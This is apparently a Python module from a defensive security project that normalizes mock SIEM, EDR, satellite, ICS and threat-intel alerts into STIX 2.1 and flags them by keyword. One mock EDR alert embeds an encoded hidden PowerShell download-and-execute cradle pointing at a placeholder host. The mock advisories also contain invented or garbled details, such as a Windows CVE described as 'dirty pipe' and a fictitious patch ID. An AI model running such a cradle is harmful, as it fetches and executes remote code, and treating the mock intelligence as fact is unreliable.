"""
ARES Telemetry Normalizer
Converts heterogeneous raw logs (CEF, Syslog, EDR, Satellite Telemetry) into standard STIX 2.1 entities.
Extracts IOCs, computes SHA-256 provenance hashes, and assigns severity.

When executed directly (`python -m src.engine.normalizer`), runs as a one-off Phase 1 batch process:
  1. Generates mock multi-domain telemetry (SIEM, EDR, Satellite EW, SCADA, OSINT, Network flows)
  2. Normalises every record into STIX 2.1-compatible objects with x_timestamp injection
  3. Writes the unified fused dataset to `data/fused_dataset.json` and exits
"""

import hashlib
import json
import os
import re
import uuid
from datetime import datetime, timedelta, timezone
from typing import Any, Dict, List, Optional
from src.engine.schemas import (
    RawTelemetryAlert,
    NormalizedStixEntity,
    SeverityLevel,
    TelemetryDomain
)


class TelemetryNormalizer:
    """Normalizes raw heterogeneous alert streams into structured STIX 2.1 objects."""

    @staticmethod
    def extract_iocs(text: str) -> List[str]:
        """Extracts IPs, domain names, hashes, and asset tags from raw text."""
        iocs = set()

        # IPv4 pattern
        ip_pattern = r'\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b'
        for ip in re.findall(ip_pattern, text):
            if not ip.startswith("127.") and ip != "0.0.0.0":
                iocs.add(f"ipv4:{ip}")

        # MD5 / SHA256 hashes
        sha256_pattern = r'\b[a-fA-F0-9]{64}\b'
        for h in re.findall(sha256_pattern, text):
            iocs.add(f"hash-sha256:{h}")

        md5_pattern = r'\b[a-fA-F0-9]{32}\b'
        for h in re.findall(md5_pattern, text):
            iocs.add(f"hash-md5:{h}")

        # Satellite / Defense asset tags
        asset_pattern = r'\b(SAT-[A-Z0-9-]+|PLC-[A-Z0-9-]+|GW-[0-9]+|S[0-9]-GW-[0-9]+)\b'
        for asset in re.findall(asset_pattern, text):
            iocs.add(f"defense-asset:{asset}")

        # NORAD Catalog ID pattern
        norad_pattern = r'\b(?:NORAD[:\s-]?|\bCATNR[:\s-]?)(\d{4,6})\b'
        for norad in re.findall(norad_pattern, text, re.IGNORECASE):
            iocs.add(f"norad-cat-id:{norad}")

        # Real Spacecraft / Satellite Identifiers
        sat_names = r'\b(SAR-LUPE\s*\d+|NAVSTAR\s*\d+|COSMO-SkyMed\s*\d*|SAPPHIRE|PRAETORIAN\s*[A-Z0-9_]*|MILSTAR\s*\d*|WGS-\d+)\b'
        for sname in re.findall(sat_names, text, re.IGNORECASE):
            iocs.add(f"defense-satellite-asset:{sname.strip()}")

        # RF Bands & Jamming indicators
        rf_pattern = r'\b(Ku-Band|Ka-Band|X-Band|C-Band|S-Band|UHF|SHF)\b'
        for rf in re.findall(rf_pattern, text, re.IGNORECASE):
            iocs.add(f"rf-band:{rf.upper()}")

        return sorted(list(iocs))

    @staticmethod
    def calculate_severity(alert: RawTelemetryAlert) -> SeverityLevel:
        """Determines alert severity based on domain, event code, and payload signals."""
        payload_lower = alert.raw_payload.lower()

        # Critical triggers
        if any(w in payload_lower for w in ["critical", "zero_day", "unauthorized modbus", "transponder lock lost", "rf jamming", "carrier jamming", "dirty pipe"]):
            return SeverityLevel.CRITICAL

        # High triggers
        if any(w in payload_lower for w in ["failed ssh logins", "auth_fail_burst", "powershell.exe", "lsass", "c2 node", "cobalt strike", "beaconing", "ephemeris_anomaly", "ephemeris drift", "telemetry lock disrupted", "doppler"]):
            return SeverityLevel.HIGH

        # Medium triggers
        if any(w in payload_lower for w in ["port scan", "syn probe", "uncommon activity", "snr drop"]):
            return SeverityLevel.MEDIUM

        # Low triggers / benign
        if any(w in payload_lower for w in ["info:", "scheduled", "authorized", "backup"]):
            return SeverityLevel.LOW

        return SeverityLevel.MEDIUM

    @classmethod
    def normalize_alert(cls, alert: RawTelemetryAlert) -> NormalizedStixEntity:
        """Converts a single RawTelemetryAlert to a NormalizedStixEntity with cryptographic hash."""
        # Calculate SHA-256 hash of raw payload for provenance tracking
        raw_hash = hashlib.sha256(alert.raw_payload.encode("utf-8")).hexdigest()
        
        # Extract IOCs
        iocs = cls.extract_iocs(alert.raw_payload)
        if alert.source_ip:
            iocs.append(f"src-ip:{alert.source_ip}")
        if alert.destination_ip:
            iocs.append(f"dst-ip:{alert.destination_ip}")
        if alert.target_entity:
            iocs.append(f"target:{alert.target_entity}")
        iocs = sorted(list(set(iocs)))

        severity = cls.calculate_severity(alert)
        confidence = 0.95 if severity in [SeverityLevel.CRITICAL, SeverityLevel.HIGH] else 0.70

        return NormalizedStixEntity(
            stix_id=f"stix-obs-{alert.alert_id.lower()}",
            original_alert_id=alert.alert_id,
            timestamp=alert.timestamp,
            domain=alert.domain,
            entity_type="observed-data",
            name=f"{alert.domain.value.upper()} Event [{alert.event_code or alert.source_name}]",
            description=alert.raw_payload[:300],
            severity=severity,
            confidence=confidence,
            iocs=iocs,
            tactics_hint=alert.event_code,
            raw_reference_hash=raw_hash
        )

    @classmethod
    def normalize_batch(cls, alerts: List[RawTelemetryAlert]) -> List[NormalizedStixEntity]:
        """Batch normalizes an incoming list of raw alerts."""
        return [cls.normalize_alert(a) for a in alerts]


# ---------------------------------------------------------------------------
# Phase 1 helpers: mock telemetry generation
# ---------------------------------------------------------------------------

def _ts(offset_minutes: float = 0, base: Optional[datetime] = None) -> str:
    """Returns an ISO 8601 UTC timestamp offset by the given number of minutes."""
    ref = base or datetime.now(timezone.utc)
    return (ref - timedelta(minutes=offset_minutes)).isoformat()


def _build_mock_alerts() -> List[RawTelemetryAlert]:
    """
    Generates a diverse mock telemetry dataset covering five data-source categories:
      1. Cyber SIEM (CEF / QRadar format)
      2. EDR process execution logs (CrowdStrike Falcon)
      3. Satellite EW / RF anomalies
      4. SCADA / ICS Modbus telemetry
      5. OSINT / threat-intel advisory feeds
      6. Network flow sensor data (Suricata NIDS)
    All records share a common schema anchored by strict x_timestamp injection.
    """
    now = datetime.now(timezone.utc)
    alerts: List[RawTelemetryAlert] = []

    # -----------------------------------------------------------------------
    # 1. Cyber SIEM — credential stuffing burst (CEF format)
    # -----------------------------------------------------------------------
    alerts.append(RawTelemetryAlert(
        alert_id=f"SIEM-{uuid.uuid4().hex[:8].upper()}",
        timestamp=_ts(45, now),
        domain=TelemetryDomain.CYBER_SIEM,
        source_name="IBM-QRadar-SIEM",
        raw_payload=(
            "CEF:0|IBM|QRadar|7.5.0|AUTH_FAIL_BURST|"
            "1,420 failed SSH logins within 45 seconds on Gateway-04|9|"
            "src=198.51.100.44 dst=10.4.1.1 suser=svc_satcomm "
            "msg=Multiple authentication failures followed by single successful login"
        ),
        sector="Sector-4-North",
        target_entity="10.4.1.1",
        source_ip="198.51.100.44",
        destination_ip="10.4.1.1",
        event_code="AUTH_FAIL_BURST",
        metadata={"failed_attempts": 1420, "compromised_user": "svc_satcomm"},
    ))

    # -----------------------------------------------------------------------
    # 2. Cyber SIEM — lateral movement / SMB discovery
    # -----------------------------------------------------------------------
    alerts.append(RawTelemetryAlert(
        alert_id=f"SIEM-{uuid.uuid4().hex[:8].upper()}",
        timestamp=_ts(38, now),
        domain=TelemetryDomain.CYBER_SIEM,
        source_name="IBM-QRadar-SIEM",
        raw_payload=(
            "CEF:0|IBM|QRadar|7.5.0|LATERAL_MOVE|"
            "SMB share enumeration from 10.4.1.1 to 10.4.1.0/24|8|"
            "src=10.4.1.1 dst=10.4.1.0/24 "
            "msg=NetScan module detected; possible lateral movement"
        ),
        sector="Sector-4-North",
        target_entity="10.4.1.0/24",
        source_ip="10.4.1.1",
        event_code="SMB_LATERAL_MOVE",
        metadata={"scanned_hosts": 254},
    ))

    # -----------------------------------------------------------------------
    # 3. EDR — encoded PowerShell + LSASS dump
    # -----------------------------------------------------------------------
    alerts.append(RawTelemetryAlert(
        alert_id=f"EDR-{uuid.uuid4().hex[:8].upper()}",
        timestamp=_ts(30, now),
        domain=TelemetryDomain.CYBER_EDR,
        source_name="CrowdStrike-Falcon-EDR",
        raw_payload=(
            "PROCESS_INJECTION: powershell.exe -NonI -W Hidden -enc "
            "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
            "LgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4A"
            "MQAxADMALgA4ADgALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA== spawned by svc_satcomm "
            "on S4-GW-01. Attempted LSASS memory dump."
        ),
        sector="Sector-4-North",
        target_entity="S4-GW-01",
        source_ip="10.4.1.1",
        event_code="EDR_PROCESS_SUSPICIOUS",
        metadata={"process_name": "powershell.exe", "encoded_command": True},
    ))

    # -----------------------------------------------------------------------
    # 4. EDR — persistence via registry run key
    # -----------------------------------------------------------------------
    alerts.append(RawTelemetryAlert(
        alert_id=f"EDR-{uuid.uuid4().hex[:8].upper()}",
        timestamp=_ts(27, now),
        domain=TelemetryDomain.CYBER_EDR,
        source_name="CrowdStrike-Falcon-EDR",
        raw_payload=(
            "REGISTRY_MOD: svchost.exe created registry key "
            "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\AresBeacon "
            "pointing to C:\\Windows\\Temp\\update_svc.exe on host S4-GW-01."
        ),
        sector="Sector-4-North",
        target_entity="S4-GW-01",
        source_ip="10.4.1.1",
        event_code="EDR_REGISTRY_PERSISTENCE",
        metadata={"registry_key": "HKLM\\...\\Run\\AresBeacon"},
    ))

    # -----------------------------------------------------------------------
    # 5. Network flow — C2 HTTPS beaconing
    # -----------------------------------------------------------------------
    alerts.append(RawTelemetryAlert(
        alert_id=f"NET-{uuid.uuid4().hex[:8].upper()}",
        timestamp=_ts(22, now),
        domain=TelemetryDomain.CYBER_SIEM,
        source_name="Suricata-NIDS",
        raw_payload=(
            "SURICATA_ALERT: Suspicious periodic HTTPS outbound beaconing (jitter 3.2%) "
            "to known APT C2 node 203.0.113.88:443. "
            "JA3 TLS fingerprint matches Cobalt Strike malleable C2 profile. "
            "Interval 30 s, duration > 2 h."
        ),
        sector="Sector-4-North",
        target_entity="S4-GW-01",
        source_ip="10.4.1.1",
        destination_ip="203.0.113.88",
        event_code="NIDS_C2_BEACON",
        metadata={"ja3_hash": "e7d705a3286e19ea42f587b344ee6865", "beacon_interval_sec": 30},
    ))

    # -----------------------------------------------------------------------
    # 6. Network flow — DNS tunnelling exfil
    # -----------------------------------------------------------------------
    alerts.append(RawTelemetryAlert(
        alert_id=f"NET-{uuid.uuid4().hex[:8].upper()}",
        timestamp=_ts(18, now),
        domain=TelemetryDomain.CYBER_SIEM,
        source_name="Suricata-NIDS",
        raw_payload=(
            "SURICATA_ALERT: High-entropy DNS TXT record requests from 10.4.1.1 "
            "to resolver 8.8.8.8; avg label length 58 chars, query rate 120/min. "
            "Possible DNS tunnelling exfiltration channel (iodine/dnscat2)."
        ),
        sector="Sector-4-North",
        target_entity="10.4.1.1",
        source_ip="10.4.1.1",
        destination_ip="8.8.8.8",
        event_code="NIDS_DNS_TUNNEL",
        metadata={"avg_label_length": 58, "query_rate_per_min": 120},
    ))

    # -----------------------------------------------------------------------
    # 7. Satellite EW — Ku-band RF carrier jamming
    # -----------------------------------------------------------------------
    alerts.append(RawTelemetryAlert(
        alert_id=f"SAT-{uuid.uuid4().hex[:8].upper()}",
        timestamp=_ts(50, now),
        domain=TelemetryDomain.SATELLITE_EW,
        source_name="SAT-GROUND-RELAY-04",
        raw_payload=(
            "ANOMALY: High-power RF carrier jamming detected on 14.2 GHz uplink (Ku-Band). "
            "Signal-to-Noise Ratio (SNR) dropped by 18.4 dB. "
            "Transponder lock lost on SAT-DEF-09. "
            "Estimated jammer EIRP > 50 dBW."
        ),
        sector="Sector-4-North",
        target_entity="SAT-DEF-09",
        event_code="SAT_RF_JAM_ALERT",
        metadata={"snr_drop_db": 18.4, "frequency_ghz": 14.2, "carrier_band": "Ku-Band"},
    ))

    # -----------------------------------------------------------------------
    # 8. Satellite EW — ephemeris drift / orbital anomaly
    # -----------------------------------------------------------------------
    alerts.append(RawTelemetryAlert(
        alert_id=f"SAT-{uuid.uuid4().hex[:8].upper()}",
        timestamp=_ts(42, now),
        domain=TelemetryDomain.SATELLITE_EW,
        source_name="GPS-Constellation-Monitor",
        raw_payload=(
            "EPHEMERIS_ANOMALY: NAVSTAR GPS PRN-21 broadcasting corrupted ephemeris data. "
            "Predicted vs observed Doppler residual delta 4.8 kHz exceeds 2σ threshold. "
            "Possible GPS spoofing attack. Correlated with Ku-Band jamming in Sector-4-North."
        ),
        sector="Sector-4-North",
        target_entity="NAVSTAR 21",
        event_code="GPS_EPHEMERIS_SPOOF",
        metadata={"prn": 21, "doppler_delta_khz": 4.8},
    ))

    # -----------------------------------------------------------------------
    # 9. SCADA / ICS — Modbus unauthorized write (PLC antenna controller)
    # -----------------------------------------------------------------------
    alerts.append(RawTelemetryAlert(
        alert_id=f"ICS-{uuid.uuid4().hex[:8].upper()}",
        timestamp=_ts(10, now),
        domain=TelemetryDomain.SATELLITE_EW,
        source_name="SCADA-GROUND-PLC-02",
        raw_payload=(
            "CRITICAL: Unauthorized Modbus/TCP command (Function Code 16 — Write Multiple "
            "Holding Registers) sent to Satellite Antenna Azimuth/Elevation Controller "
            "from S4-GW-01. Commanded 45-degree off-axis misalignment on PLC-AZ-EL-02."
        ),
        sector="Sector-4-North",
        target_entity="PLC-AZ-EL-02",
        source_ip="10.4.1.1",
        event_code="ICS_MODBUS_UNAUTHORIZED_WRITE",
        metadata={"function_code": 16, "tampered_register": "ANTENNA_SLEW_RATE"},
    ))

    # -----------------------------------------------------------------------
    # 10. SCADA / ICS — historian data manipulation
    # -----------------------------------------------------------------------
    alerts.append(RawTelemetryAlert(
        alert_id=f"ICS-{uuid.uuid4().hex[:8].upper()}",
        timestamp=_ts(8, now),
        domain=TelemetryDomain.SATELLITE_EW,
        source_name="OSIsoft-PI-Historian",
        raw_payload=(
            "CRITICAL: Historian tag values for POWER_BUS_VOLTAGE and THERMAL_CONTROL "
            "overwritten with static replayed values. Likely sensor-replay attack on "
            "ground-station power management subsystem."
        ),
        sector="Sector-4-North",
        target_entity="PI-Historian-GS-04",
        source_ip="10.4.1.1",
        event_code="ICS_HISTORIAN_REPLAY_ATTACK",
        metadata={"affected_tags": ["POWER_BUS_VOLTAGE", "THERMAL_CONTROL"]},
    ))

    # -----------------------------------------------------------------------
    # 11. OSINT — dark-web APT advisory (STIX 2.1 feed)
    # -----------------------------------------------------------------------
    alerts.append(RawTelemetryAlert(
        alert_id=f"OSINT-{uuid.uuid4().hex[:8].upper()}",
        timestamp=_ts(120, now),
        domain=TelemetryDomain.OSINT_INTEL,
        source_name="CISA-ADVISORY-FEED",
        raw_payload=(
            "CISA AA24-317A: APT28 (Fancy Bear) campaign targeting satellite ground-station "
            "operators. Known C2 IPs: 203.0.113.88, 198.51.100.99. "
            "Techniques: T1078 (Valid Accounts), T1059.001 (PowerShell), "
            "T1071.001 (Web Protocols), T0814 (Denial of Control). "
            "Attribution confidence 89%."
        ),
        sector="Sector-Global",
        event_code="OSINT_APT_ADVISORY",
        metadata={"advisory_id": "AA24-317A", "threat_actor": "APT28"},
    ))

    # -----------------------------------------------------------------------
    # 12. OSINT — CVE bulletin
    # -----------------------------------------------------------------------
    alerts.append(RawTelemetryAlert(
        alert_id=f"OSINT-{uuid.uuid4().hex[:8].upper()}",
        timestamp=_ts(90, now),
        domain=TelemetryDomain.OSINT_INTEL,
        source_name="NVD-FEED",
        raw_payload=(
            "CVE-2024-30088 CVSS 9.8: Windows Kernel privilege escalation via dirty pipe "
            "used in the wild by Sandworm (APT44) against military-sector targets. "
            "Patch MS24-DEC available. CISA KEV confirmed."
        ),
        sector="Sector-Global",
        event_code="CVE_KEV_ALERT",
        metadata={"cve_id": "CVE-2024-30088", "cvss": 9.8, "kev_confirmed": True},
    ))

    # -----------------------------------------------------------------------
    # 13. Adversarial chaff — decoy port-scan flood (10 records)
    # -----------------------------------------------------------------------
    for i in range(10):
        alerts.append(RawTelemetryAlert(
            alert_id=f"CHAFF-{i:04d}",
            timestamp=_ts(3 + i * 0.3, now),
            domain=TelemetryDomain.CYBER_SIEM,
            source_name="Edge-Firewall-Noise",
            raw_payload=(
                f"FW_DROP: Inbound TCP SYN probe dropped from 192.0.2.{i * 13 % 250} "
                f"on port {1024 + i}. No service listening."
            ),
            sector="Sector-2-East",
            target_entity="Edge-Firewall-Cluster",
            source_ip=f"192.0.2.{i * 13 % 250}",
            event_code="FW_SYN_DROP",
            metadata={"is_synthetic_decoy": True},
        ))

    # -----------------------------------------------------------------------
    # 14. Stealth zero-day hidden inside chaff (Sector-2-East)
    # -----------------------------------------------------------------------
    alerts.append(RawTelemetryAlert(
        alert_id="STEALTH-001",
        timestamp=_ts(4.5, now),
        domain=TelemetryDomain.CYBER_EDR,
        source_name="CrowdStrike-Falcon-EDR",
        raw_payload=(
            "ZERO_DAY_EXFIL: Stealth privilege escalation via dirty pipe exploit followed "
            "by unencrypted database dump of tactical operational plans to external VPS "
            "198.51.100.99."
        ),
        sector="Sector-2-East",
        target_entity="Ops-Database-Core",
        source_ip="10.2.0.50",
        destination_ip="198.51.100.99",
        event_code="STEALTH_DATA_EXFIL",
        metadata={"is_synthetic_decoy": False, "high_value_target": "Ops-Database-Core"},
    ))

    # -----------------------------------------------------------------------
    # 15. Benign background noise (authorized scanner + backup job)
    # -----------------------------------------------------------------------
    alerts.append(RawTelemetryAlert(
        alert_id="BENIGN-01",
        timestamp=_ts(60, now),
        domain=TelemetryDomain.CYBER_SIEM,
        source_name="Nessus-Vulnerability-Scanner",
        raw_payload=(
            "INFO: Scheduled weekly authorized vulnerability scanner 10.3.0.254 "
            "scanned 50 hosts in Subnet 10.3.0.0/24."
        ),
        sector="Sector-3-Central",
        target_entity="10.3.0.0/24",
        source_ip="10.3.0.254",
        event_code="NESSUS_SCAN_AUTHORIZED",
        metadata={"authorized": True},
    ))
    alerts.append(RawTelemetryAlert(
        alert_id="BENIGN-02",
        timestamp=_ts(55, now),
        domain=TelemetryDomain.CYBER_EDR,
        source_name="Veeam-Backup-Agent",
        raw_payload=(
            "INFO: High disk I/O and mass file read detected by VeeamBackupService.exe "
            "during scheduled incremental backup."
        ),
        sector="Sector-3-Central",
        target_entity="FileServer-03",
        event_code="BACKUP_JOB_COMPLETED",
        metadata={"authorized": True},
    ))

    return alerts


def _stix_entity_to_dict(entity: NormalizedStixEntity) -> Dict[str, Any]:
    """
    Serialises a NormalizedStixEntity as a STIX 2.1-shaped dict, injecting the
    mandatory `x_timestamp` extension field required by the correlation engine.
    """
    return {
        # --- STIX 2.1 core fields ---
        "type": entity.entity_type,                   # e.g. "observed-data"
        "spec_version": "2.1",
        "id": entity.stix_id,
        "created": entity.timestamp,
        "modified": entity.timestamp,
        "name": entity.name,
        "description": entity.description,
        "confidence": int(entity.confidence * 100),   # STIX confidence is 0–100
        # --- STIX 2.1 custom extension fields (x_ prefix) ---
        "x_timestamp": entity.timestamp,              # canonical timestamp for correlation window
        "x_severity": entity.severity.value,
        "x_domain": entity.domain.value,
        "x_iocs": entity.iocs,
        "x_tactics_hint": entity.tactics_hint,
        "x_original_alert_id": entity.original_alert_id,
        "x_sha256_provenance": entity.raw_reference_hash,
    }


def run_phase1_batch(output_path: str = "data/fused_dataset.json") -> None:
    """
    Phase 1 entry point — runs once, writes `fused_dataset.json`, and exits.

    Steps:
      1. Generate mock multi-domain telemetry alerts
      2. Normalise every alert into a STIX 2.1 NormalizedStixEntity
      3. Serialise to dicts (injecting x_timestamp on each record)
      4. Write to `output_path`
    """
    print("[ARES Phase 1] Generating mock multi-domain telemetry…")
    raw_alerts = _build_mock_alerts()
    print(f"             {len(raw_alerts)} raw alerts generated across "
          f"{len({a.domain for a in raw_alerts})} domains.")

    print("[ARES Phase 1] Normalising to STIX 2.1 entities…")
    normalizer = TelemetryNormalizer()
    stix_entities = normalizer.normalize_batch(raw_alerts)

    # Sort by canonical timestamp ascending so the replayer streams in time order
    stix_entities.sort(key=lambda e: e.timestamp)

    stix_dicts = [_stix_entity_to_dict(e) for e in stix_entities]

    # Ensure output directory exists
    out_dir = os.path.dirname(output_path)
    if out_dir:
        os.makedirs(out_dir, exist_ok=True)

    with open(output_path, "w", encoding="utf-8") as fh:
        json.dump(stix_dicts, fh, indent=2, ensure_ascii=False)

    print(f"[ARES Phase 1] ✓ {len(stix_dicts)} STIX 2.1 objects written → {output_path}")
    print("[ARES Phase 1] Done. Phase 1 complete.")


if __name__ == "__main__":
    run_phase1_batch()
